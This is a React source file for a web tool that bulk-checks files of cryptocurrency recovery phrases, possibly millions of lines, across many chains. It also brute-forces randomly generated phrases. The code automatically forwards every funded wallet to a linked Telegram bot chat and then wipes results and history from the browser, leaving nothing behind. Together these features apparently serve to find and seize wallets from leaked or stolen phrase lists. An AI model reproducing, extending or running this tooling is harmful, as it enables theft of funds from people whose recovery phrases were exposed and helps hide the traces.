import { useEffect, useMemo, useRef, useState } from "react";
import { X } from "lucide-react";
import AutoGenerator from "@/components/wallet/scan/AutoGenerator";
import FundedExport from "@/components/wallet/scan/FundedExport";
import PhraseInput from "@/components/wallet/scan/PhraseInput";
import RpcKeysPanel from "@/components/wallet/scan/RpcKeysPanel";
import ScanLivePanel from "@/components/wallet/scan/ScanLivePanel";
import ScanProgress from "@/components/wallet/scan/ScanProgress";
import ScanSummary from "@/components/wallet/scan/ScanSummary";
import ScanHistory from "@/components/wallet/scan/ScanHistory";
import ScanResultsPanel from "@/components/wallet/scan/ScanResultsPanel";
import { buildWalletMessage } from "@/lib/funded-report";
import { savedBot, sendMessage } from "@/lib/telegram-bot";
import { clearHistory, saveRun } from "@/lib/scan-history";
import { fetchPricesFor } from "@/lib/chains/prices";
import useWakeLock from "@/hooks/useWakeLock";
import { countPhrasesInFile, phrasesFromFile, scanAssets, scanPhraseStream } from "@/lib/phrase-scan";
import { autoPhrases } from "@/lib/phrase-generator";
import { SCAN_BATCH_SIZE } from "@/lib/chains/scan-pipeline";

const PAGE = 100;
// How many of the file's first lines are kept for the line-by-line list.
const PREVIEW_LINES = 5000;

const EMPTY_LIVE = {
  completed: 0,
  started: 0,
  fundedCount: 0,
  fundedTotal: 0,
  failed: 0,
  invalid: 0,
  // The batch currently being checked, so the run is shown batch by batch.
  batch: null,
  // How many funded wallets were delivered to the linked chat.
  sent: 0,
  // Cores deriving the phrases: one means worker threads are unavailable.
  cores: 0,
};

export default function ScanWorkspace() {
  const [fileName, setFileName] = useState("");
  // The chosen file's own lines, shown line by line under the picker.
  const [lines, setLines] = useState([]);
  const [linesTotal, setLinesTotal] = useState(0);
  // A chosen file is read through first: its wallets are counted, and only then
  // does the chain check start — in batches, on request.
  const [reading, setReading] = useState(false);
  // How far the file itself has been read, so a big file shows real progress.
  const [readStats, setReadStats] = useState({ bytes: 0, size: 0, lines: 0 });
  // Phrases that already passed the checksum while the file is still being read,
  // so the found count grows on screen instead of only appearing at the end.
  const [foundLive, setFoundLive] = useState(0);
  const [pendingCount, setPendingCount] = useState(0);
  // When the file's lines are real phrases of another length, that length: the
  // screen offers it instead of leaving "0 wallets" unexplained.
  const [suggest, setSuggest] = useState(0);
  // Lines that are not real BIP-39 phrases: counted apart, never scanned.
  const [unreadable, setUnreadable] = useState(0);
  const [words, setWords] = useState(12);
  // Every phrase is always checked on accounts 1–3: the second and third wallets
  // it derives are scanned too, without a choice on screen.
  const accounts = 3;
  // Whether every other token a wallet holds is looked up as well. Off by
  // default: the indexer's key allows a few calls a second and a wallet costs
  // several, which is what made a big scan take minutes. On, only as many
  // wallets a second are found as the keys allow.
  const [deep, setDeep] = useState(false);
  const [total, setTotal] = useState(0);
  const [started, setStarted] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [stats, setStats] = useState({ ...EMPTY_LIVE });
  const [page, setPage] = useState(1);
  const [onlyFunded, setOnlyFunded] = useState(false);
  const [error, setError] = useState("");
  const [elapsed, setElapsed] = useState(0);
  const [version, setVersion] = useState(0);
  // The report panel waits for the typing to settle, so a line-by-line scan does
  // not fire one Telegram report per line.
  const [exportReady, setExportReady] = useState(false);
  // Bumped whenever a run is logged, so the history section re-reads its list.
  const [historyKey, setHistoryKey] = useState(0);
  // Set once a finished run has been delivered to the chat and wiped here.
  const [wiped, setWiped] = useState(false);

  const resultsRef = useRef([]);
  const queueRef = useRef([]);
  // The chosen file, kept so a change of phrase length can read it again.
  const chosenFileRef = useRef(null);
  // The file waiting for its chain check, kept until the scan is started.
  const pendingFileRef = useRef(null);
  // Funded wallets are delivered one after another, never in one burst.
  const sendChainRef = useRef(Promise.resolve());
  const busyRef = useRef(false);
  const pricesRef = useRef(null);
  const startedAtRef = useRef(0);
  const liveRef = useRef({ ...EMPTY_LIVE });
  const cancelledRef = useRef(false);
  const countRef = useRef(0);
  const flushRef = useRef(null);
  const settleRef = useRef(null);
  // The random-phrase test: whether it keeps generating, and how many network
  // reads each chain has failed so far.
  const autoRunRef = useRef(false);
  const chainFailsRef = useRef({});
  const [autoRunning, setAutoRunning] = useState(false);
  const [autoGenerated, setAutoGenerated] = useState(0);
  // The lengths the test generates — all of them until one is turned off.
  const [autoSizes, setAutoSizes] = useState([12, 15, 18, 21, 24]);

  // Never one render per phrase (a scan can hold millions), but a phrase that
  // comes back is pushed to the list within a moment of being found — results
  // appear one by one while the scan is still running.
  function scheduleFlush() {
    if (flushRef.current) return;
    flushRef.current = setTimeout(() => {
      flushRef.current = null;
      setStats({ ...liveRef.current });
      setVersion((value) => value + 1);
    }, 90);
  }

  useEffect(
    () => () => {
      if (flushRef.current) clearTimeout(flushRef.current);
      if (settleRef.current) clearTimeout(settleRef.current);
    },
    [],
  );

  function scheduleExport() {
    if (settleRef.current) clearTimeout(settleRef.current);
    settleRef.current = setTimeout(() => {
      settleRef.current = null;
      if (resultsRef.current.some((slot) => slot.status === "done")) setExportReady(true);
    }, 2000);
  }

  // The screen stays awake while a scan runs: a sleeping or locked phone stops
  // the page's network work, so the scan would stall until it is unlocked.
  useWakeLock(scanning);

  // A batch can take seconds on a busy node: the clock keeps ticking so a slow
  // scan still shows that work is moving.
  useEffect(() => {
    if (!scanning) return undefined;
    const tick = () => setElapsed(Math.floor((Date.now() - startedAtRef.current) / 1000));
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [scanning]);

  // The listed count is the truth: it is how many phrases were actually found
  // and checked, so the number on screen always matches the rows below it.
  // The list below holds wallets only: an unreadable line is reported as a
  // number, never as a row.
  // Newest first: the wallet whose balances just landed sits at the top of the
  // list, so a scan in progress always shows its latest result first. Each row
  // keeps its arrival number, which is the label it shows.
  const { rows, foundCount, fundedTotalCount, chainFailures } = useMemo(() => {
    const list = resultsRef.current
      .map((slot, position) => ({ slot, position }))
      .filter(({ slot }) => slot.status === "done");
    return {
      foundCount: list.length,
      // Which chains failed to answer, worst first: the point of the random
      // phrase test is to see that at a glance.
      chainFailures: Object.entries(chainFailsRef.current)
        .map(([symbol, count]) => ({ symbol, count }))
        .sort((a, b) => b.count - a.count)
        .slice(0, 10),
      fundedTotalCount: list.reduce((sum, { slot }) => sum + (slot.total > 0 ? 1 : 0), 0),
      // Funded wallets come first, so a hit is never buried under empty ones;
      // within each group the newest result stays on top.
      rows: (onlyFunded ? list.filter(({ slot }) => slot.total > 0) : list)
        .slice()
        .sort(
          (a, b) =>
            Number(b.slot.total > 0) - Number(a.slot.total > 0) || b.position - a.position,
        ),
    };
  }, [version, onlyFunded]);

  const visible = rows.slice(0, page * PAGE);

  // A different phrase length reads the same file again, so the wallets counted
  // on screen match the length that will actually be scanned.
  function changeWords(size) {
    setWords(size);
    // Only a file still waiting to be scanned is read again: a finished run
    // keeps its results until the file is chosen again.
    const pending = pendingFileRef.current;
    if (pending && !busyRef.current && !reading) readFile(pending.file, size);
  }

  // Every funded wallet goes to the linked Telegram chat as soon as its balances
  // land — no button to press. Sends are queued, so a burst of funded wallets
  // never trips Telegram's rate limit.
  function deliverFunded(result) {
    const bot = savedBot();
    if (!bot.token || !bot.chatId) return;
    sendChainRef.current = sendChainRef.current
      .then(async () => {
        await sendMessage(bot.token, bot.chatId, buildWalletMessage(result));
        liveRef.current.sent += 1;
        scheduleFlush();
      })
      .catch(() => {
        // A failed send must never stop the scan.
      });
  }

  // Everything the scan reports goes through here, so a file's wallets fill the
  // results one by one.
  function scanHandlers(prices) {
    const live = liveRef.current;
    return {
      prices,
      accounts,
      isCancelled: () => cancelledRef.current,
      onResult: (result) => {
        // An unreadable line is only counted, once per line rather than once per
        // account, so the number matches the file and the list stays wallets only.
        if (result.status !== "done") {
          if (!result.account) live.invalid += 1;
          scheduleFlush();
          return;
        }
        resultsRef.current.push(result);
        if (result.total > 0) {
          live.fundedCount += 1;
          live.fundedTotal += result.total;
          // A wallet holding funds is sent to the linked chat on its own.
          result.sent = true;
          deliverFunded(result);
        }
        // Counted per network, not per asset: a single chain that did not answer
        // used to be reported as ten failed reads, which made a run look broken.
        if (result.failedChains?.length) {
          live.failed += result.failedChains.length;
          // Tallied per chain as well, so the tester can name the chains that
          // keep refusing instead of only counting the misses.
          for (const symbol of result.failedChains) {
            chainFailsRef.current[symbol] = (chainFailsRef.current[symbol] || 0) + 1;
          }
        }
        scheduleFlush();
      },
      onProgress: ({ completed, started: begun, batch, cores }) => {
        live.completed = completed;
        if (begun !== undefined) live.started = begun;
        if (batch) live.batch = batch;
        if (cores) live.cores = cores;
        // The processed counter ticks on its own, so a slow batch still shows
        // that work is moving.
        scheduleFlush();
      },
      // Reads that failed during the scan are asked again once it is quiet: a
      // wallet that answers then is folded back into the list, and one that turns
      // out to hold funds goes to the linked chat like any other.
      onRepair: () => {
        const list = resultsRef.current;
        const funded = list.filter((slot) => slot.total > 0);
        live.fundedCount = funded.length;
        live.fundedTotal = funded.reduce((sum, slot) => sum + slot.total, 0);
        live.failed = list.reduce((sum, slot) => sum + (slot.failedChains?.length || 0), 0);
        for (const slot of funded) {
          if (slot.sent) continue;
          slot.sent = true;
          deliverFunded(slot);
        }
        scheduleFlush();
      },
    };
  }

  // Prices only feed the USD total: a slow or blocked price feed must never
  // hold the scan at zero.
  async function resolvePrices() {
    if (!pricesRef.current) {
      pricesRef.current = await Promise.race([
        fetchPricesFor(scanAssets),
        new Promise((resolve) => setTimeout(() => resolve({}), 2500)),
      ]);
    }
    return pricesRef.current;
  }

  // Every finished run is logged: funded wallets keep a row with their
  // addresses, the rest are only counted, so the log never holds a phrase.
  function recordRun(slice) {
    const scanned = slice.filter((slot) => slot.status === "done");
    if (!scanned.length) return;
    const funded = scanned.filter((slot) => slot.total > 0);
    saveRun({
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
      at: Date.now(),
      scanned: scanned.length,
      funded: funded.length,
      total: funded.reduce((sum, slot) => sum + slot.total, 0),
      wallets: funded.map((slot) => ({
        line: slot.line,
        account: slot.account || 0,
        total: slot.total,
        funded: slot.funded,
        addresses: slot.addresses,
        failed: slot.failed,
        failedChains: slot.failedChains,
      })),
    });
    setHistoryKey((value) => value + 1);
  }

  function stop() {
    cancelledRef.current = true;
    queueRef.current = [];
    // A running generator stops producing phrases with the scan it feeds.
    autoRunRef.current = false;
    setAutoRunning(false);
  }

  function clearResults() {
    resultsRef.current = [];
    queueRef.current = [];
    pendingFileRef.current = null;
    setPendingCount(0);
    setReading(false);
    liveRef.current = { ...EMPTY_LIVE };
    chainFailsRef.current = {};
    countRef.current = 0;
    startedAtRef.current = 0;
    setStats({ ...EMPTY_LIVE });
    setStarted(false);
    setLines([]);
    setLinesTotal(0);
    setReadStats({ bytes: 0, size: 0, lines: 0 });
    setFoundLive(0);
    setUnreadable(0);
    setSuggest(0);
    setTotal(0);
    setPage(1);
    setOnlyFunded(false);
    setElapsed(0);
    setError("");
    if (settleRef.current) {
      clearTimeout(settleRef.current);
      settleRef.current = null;
    }
    setExportReady(false);
    setVersion((value) => value + 1);
  }

  function clearAll() {
    stop();
    clearResults();
    chosenFileRef.current = null;
    setFileName("");
  }

  // Delivered to the linked chat: the funded wallets are there now, so the run is
  // wiped from this device — results, history, file name, nothing left behind.
  function wipeAfterDelivery() {
    clearAll();
    clearHistory();
    setHistoryKey((value) => value + 1);
    setWiped(true);
  }

  // A scan already running is stopped first: the file then starts from a clean
  // slate instead of racing the run in progress.
  async function waitIdle(maxMs = 5000) {
    const until = Date.now() + maxMs;
    while (busyRef.current && Date.now() < until) {
      await new Promise((resolve) => setTimeout(resolve, 60));
    }
  }

  // Step 1: the whole file is read through first and its wallets are counted —
  // no chain is asked about until that number is on screen.
  async function readFile(file, size = words) {
    setError("");
    setWiped(false);

    stop();
    clearResults();
    setFileName(file.name);
    chosenFileRef.current = file;
    await waitIdle();

    cancelledRef.current = false;
    pendingFileRef.current = null;
    setReading(true);
    setReadStats({ bytes: 0, size: file.size, lines: 0 });
    // How many wallets the file turned out to hold: with any, the chain check
    // starts by itself the moment the file has been read through.
    let ready = 0;

    try {
      const { count: found, invalid, preview, suggest: hint } = await countPhrasesInFile(file, {
        words: size,
        preview: PREVIEW_LINES,
        onBytes: (bytes) => setReadStats((current) => ({ ...current, bytes })),
        onProgress: (value, bad) => {
          countRef.current = value;
          setUnreadable(bad);
          setFoundLive(value);
          setReadStats((current) => ({ ...current, lines: value + bad }));
        },
      });
      // The first lines of the file are listed by line number under the picker —
      // the phrase itself is never kept in the screen's state.
      setLines((preview || []).map((entry) => ({ line: entry.line, unreadable: entry.unreadable })));
      setLinesTotal(found + invalid);
      pendingFileRef.current = { file, count: found };
      setPendingCount(found);
      setUnreadable(invalid);
      setSuggest(hint || 0);
      setTotal(found * accounts);
      ready = found;
    } catch (cause) {
      setError(
        `That file could not be read${cause?.message ? ` (${cause.message})` : ""} — a very large file can run the browser out of memory. Split it into smaller .txt files and try again.`,
      );
    } finally {
      setReading(false);
    }

    // No button to press: a file that holds wallets is checked on every chain
    // straight away. A file that found none stays put, so its phrase-length
    // hint can be used instead of scanning nothing.
    if (ready > 0) await startFileScan();
  }

  // Step 2: the file is read again and its wallets are checked chain by chain,
  // in batches, with every result landing as soon as it is read.
  async function startFileScan() {
    const pending = pendingFileRef.current;
    if (!pending) return;

    pendingFileRef.current = null;
    setPendingCount(0);
    busyRef.current = true;
    cancelledRef.current = false;
    setScanning(true);
    setStarted(true);
    startedAtRef.current = Date.now();
    setElapsed(0);
    setError("");

    try {
      const prices = await resolvePrices();
      await scanPhraseStream(
        phrasesFromFile(pending.file, {
          words,
          // Only the lines that passed the checksum pass reach the chain check.
          onlyValid: true,
          onInvalid: (bad) => setUnreadable((current) => Math.max(current, bad)),
          onCount: (value) => {
            countRef.current = value;
          },
        }),
        { ...scanHandlers(prices), deep },
      );
    } catch (cause) {
      setError(
        `The scan stopped unexpectedly${cause?.message ? ` (${cause.message})` : ""}. Try again with fewer phrases.`,
      );
    } finally {
      if (flushRef.current) {
        clearTimeout(flushRef.current);
        flushRef.current = null;
      }
      busyRef.current = false;
      cancelledRef.current = false;
      setScanning(false);
      setTotal((current) => current || Math.max(countRef.current, resultsRef.current.length) * accounts);
      setStats({ ...liveRef.current });
      setVersion((value) => value + 1);
      recordRun(resultsRef.current);
      scheduleExport();
    }
  }

  // The chain-read test: a fresh random phrase of each chosen length every
  // second, checked on every chain the moment it arrives. One wallet per phrase,
  // so each phrase answers "did the chains reply?" on its own.
  async function runAuto() {
    stop();
    clearResults();
    autoRunRef.current = true;
    setAutoRunning(true);
    setAutoGenerated(0);
    await waitIdle();

    busyRef.current = true;
    cancelledRef.current = false;
    setScanning(true);
    setStarted(true);
    startedAtRef.current = Date.now();
    setElapsed(0);
    setError("");

    try {
      const prices = await resolvePrices();
      await scanPhraseStream(
        autoPhrases({
          sizes: autoSizes,
          shouldRun: () => autoRunRef.current && !cancelledRef.current,
          onPhrase: (count) => {
            setAutoGenerated(count);
            countRef.current = count;
          },
        }),
        // A short idle flush: the stream arrives a phrase at a time, so what has
        // already come in is checked instead of waiting for a full batch.
        { ...scanHandlers(prices), accounts: 1, deep, flushIdleMs: 700 },
      );
    } catch (cause) {
      setError(`The test stopped unexpectedly${cause?.message ? ` (${cause.message})` : ""}.`);
    } finally {
      autoRunRef.current = false;
      setAutoRunning(false);
      if (flushRef.current) {
        clearTimeout(flushRef.current);
        flushRef.current = null;
      }
      busyRef.current = false;
      cancelledRef.current = false;
      setScanning(false);
      setTotal((current) => current || Math.max(countRef.current, resultsRef.current.length));
      setStats({ ...liveRef.current });
      setVersion((value) => value + 1);
      scheduleExport();
    }
  }

  function getFunded() {
    return resultsRef.current.filter((slot) => slot.total > 0);
  }

  function getAll() {
    return resultsRef.current.filter((slot) => slot.status === "done");
  }

  const hasFunds = fundedTotalCount > 0;
  const scannedTotal = total || stats.completed || foundCount;
  // Unreadable lines never reach the scan, so they are reported on their own.
  // The counting pass and the scan report the same lines, so the larger of the
  // two is the number of unreadable lines, never their sum.
  const unreadableTotal = Math.max(unreadable, stats.invalid);
  // How many rounds the chain check needs for this file. Shown before the scan
  // starts, so a file of any length is a known number of batches up front.
  const pendingBatches = pendingCount ? Math.ceil((pendingCount * accounts) / SCAN_BATCH_SIZE) : 0;

  return (
    <div className="relative">
      <AutoGenerator
        running={autoRunning}
        sizes={autoSizes}
        onSizes={setAutoSizes}
        onStart={runAuto}
        onStop={stop}
        generated={autoGenerated}
        checked={foundCount}
        failed={stats.failed}
        chainFailures={chainFailures}
      />

      <PhraseInput
        fileName={fileName}
        onFile={readFile}
        error={error}
        onCancel={stop}
        scanning={scanning}
        reading={reading}
        readStats={readStats}
        foundLive={foundLive}
        pendingCount={pendingCount}
        pendingInvalid={unreadable}
        batches={pendingBatches}
        batchSize={SCAN_BATCH_SIZE}
        suggest={suggest}
        onStartFile={startFileScan}
        words={words}
        onWords={changeWords}
        accounts={accounts}
        deep={deep}
        onDeep={setDeep}
      />

      {wiped ? (
        <p className="mt-3 rounded-xl border border-primary/25 bg-primary/[0.07] px-3 py-2 text-[10.5px] leading-relaxed text-primary/90">
          Funded wallets sent to your Telegram chat — the scan was wiped from this browser.
        </p>
      ) : null}

      <RpcKeysPanel />

      {started ? (
        <div className="mt-5 space-y-2.5">
          <div className="flex items-end justify-between">
            <div>
              <p className="text-[9px] font-medium uppercase tracking-[0.3em] text-muted-foreground/70">
                {scanning ? "Scanning" : "Results"}
              </p>
              <p className="mt-1.5 font-display text-[22px] leading-none">
                {foundCount.toLocaleString("en-US")} wallet{foundCount === 1 ? "" : "s"}
              </p>
              {unreadableTotal > 0 ? (
                <p className="mt-1 text-[10px] font-medium text-destructive/75 num">
                  {unreadableTotal.toLocaleString("en-US")} unreadable line
                  {unreadableTotal === 1 ? "" : "s"} skipped
                </p>
              ) : null}
            </div>
            <button
              type="button"
              onClick={clearAll}
              className="inline-flex items-center gap-1.5 rounded-full border border-foreground/[0.1] bg-foreground/[0.03] px-3 py-1.5 text-[10.5px] font-medium text-muted-foreground transition-colors hover:text-foreground"
            >
              <X className="h-3 w-3" />
              Clear
            </button>
          </div>

          <ScanSummary
            total={total}
            progress={{ completed: Math.max(stats.completed, foundCount), total }}
            fundedCount={fundedTotalCount}
            fundedTotal={stats.fundedTotal}
            onlyFunded={onlyFunded}
            onToggleFilter={() => {
              setOnlyFunded((value) => !value);
              setPage(1);
            }}
            finished={!scanning}
          />

          <ScanLivePanel
            completed={Math.max(stats.completed, foundCount)}
            total={total}
            started={stats.started}
            elapsed={elapsed}
            batch={stats.batch}
            cores={stats.cores}
            finished={!scanning}
          />

          <ScanProgress
            found={foundCount}
            funded={fundedTotalCount}
            fundedTotal={stats.fundedTotal}
            invalid={unreadableTotal}
            failed={stats.failed}
            sent={stats.sent}
          />

          {exportReady ? (
            <FundedExport
              getFunded={getFunded}
              getAll={getAll}
              scanned={scannedTotal}
              onDelivered={wipeAfterDelivery}
            />
          ) : null}

          {stats.failed > 0 ? (
            <p className="px-1 text-[10px] leading-relaxed text-muted-foreground/60">
              {stats.failed.toLocaleString("en-US")} network read{stats.failed === 1 ? "" : "s"} did not answer (counted
              per network per wallet) — those wallets may hold more than shown, so run the scan again for a full
              picture.
            </p>
          ) : null}

          {unreadableTotal > 0 ? (
            <p className="px-1 text-[10px] leading-relaxed text-muted-foreground/60">
              {unreadableTotal.toLocaleString("en-US")} line{unreadableTotal === 1 ? " is" : "s are"} not a valid BIP-39
              recovery phrase (word list + checksum), so {unreadableTotal === 1 ? "it was" : "they were"} kept out of
              the chain check — no line of the input was dropped.
            </p>
          ) : null}

          <ScanResultsPanel
            rows={visible}
            fileName={fileName}
            walletTotal={scannedTotal}
            hasMore={rows.length > visible.length}
            remaining={rows.length - visible.length}
            onMore={() => setPage((value) => value + 1)}
            liveCount={foundCount}
          />

          {!scanning && foundCount > 0 && fundedTotalCount === 0 ? (
            <div className="lux noise relative p-4 text-center">
              <p className="relative font-display text-[18px] leading-tight">No funds on these wallets</p>
              <p className="relative mx-auto mt-1.5 max-w-[300px] text-[10.5px] leading-relaxed text-muted-foreground/80">
                Airdrop balances may sit on chains or tokens outside this scan. Open a result to check its addresses on a
                block explorer.
              </p>
            </div>
          ) : null}

          {!scanning && hasFunds ? (
            <p className="px-1 pt-1 text-[10.5px] leading-relaxed text-muted-foreground/70">
              {fundedTotalCount} wallet{fundedTotalCount === 1 ? "" : "s"} with funds — open one to copy its addresses.
            </p>
          ) : null}
        </div>
      ) : null}

      <ScanHistory refreshKey={historyKey} />
    </div>
  );
}